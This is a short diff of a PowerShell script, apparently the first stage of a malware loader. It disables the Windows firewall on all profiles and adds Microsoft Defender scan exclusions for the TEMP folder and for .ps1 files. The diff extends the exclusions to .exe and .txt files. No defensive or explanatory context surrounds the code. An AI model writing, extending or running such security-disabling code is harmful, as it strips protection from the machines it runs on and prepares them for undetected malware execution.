@@ -4,6 +4,8 @@ try {
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
     Add-MpPreference -ExclusionPath "$env:TEMP"
     Add-MpPreference -ExclusionExtension ".ps1"
+    Add-MpPreference -ExclusionExtension ".exe"
+    Add-MpPreference -ExclusionExtension ".txt"
 } catch {
     Write-Warning "Administrative privileges required for Stage 1."
 }
